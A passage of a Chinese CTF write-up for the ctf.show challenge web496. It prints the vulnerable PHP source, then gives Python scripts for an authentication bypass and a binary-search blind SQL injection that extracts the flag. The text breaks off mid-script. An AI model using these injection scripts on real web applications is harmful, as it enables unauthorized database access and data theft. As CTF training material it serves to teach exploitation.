href="#web496" class="headerlink" title="web496"></a>web496</h1><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:42:14</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:|\,/&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="comment">#$user=unserialize($c);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/or|file|innodb|sys|mysql/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,nickname from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="variable">$user</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;clear&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;view&#x27;</span>:</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>],<span class="variable">$user</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;logout&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-14 09:23:59</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;db_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:02:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;affected_rows;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>file_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cache_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 20:02:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次发现登录之后会进入index页面,我们这里直接进行登录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182606641.png" alt="image-20220413182606641"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182616097.png" alt="image-20220413182616097"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182939258.png" alt="image-20220413182939258"></p><p>发现也就一个view有用</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413183106690.png" alt="image-20220413183106690"></p><p>又搜到一个.php文件</p><p>admin_edit.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-15 04:27:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:36:01</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$nickname</span>, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]=<span class="variable">$nickname</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/api/admin_edit.php&quot;</span></span><br><span class="line">login = <span class="string">&quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/index.php?action=check&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span> :<span class="string">&quot;1&#x27;||1=1#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;check&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">session = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">session.<span class="title function_ invoke__">post</span>(login,data=data,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8081&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select database()),1,1))=0,1,0)&quot;</span> <span class="comment">#错误</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select database()),1,1))&gt;0,1,0)&quot;</span> <span class="comment">#正确</span></span><br><span class="line">date = &#123;</span><br><span class="line">    <span class="string">&quot;user[username]&quot;</span>: f<span class="string">&quot;1&#x27; or &#123;payload&#125;#&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;nickname&#x27;</span>: f<span class="string">&quot;&#123;random.randint(1,10000)&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.<span class="title function_ invoke__">post</span>(url, data=date)</span><br><span class="line"><span class="keyword">print</span>(r.<span class="title function_ invoke__">json</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/api/admin_edit.php&quot;</span></span><br><span class="line">login = <span class="string">&quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/index.php?action=check&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span> :<span class="string">&quot;1&#x27;||1=1#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;check&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">session = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">session.<span class="title function_ invoke__">post</span>(login,data=data,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8081&quot;</span>&#125;)</span><br><span class="line">result =<span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库  flagyoudontknow76</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查表名</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flagyoudontknow76&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagisherebutyouneverknow118 from flagyoudontknow76&quot;</span></span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;user[username]&quot;</span>: 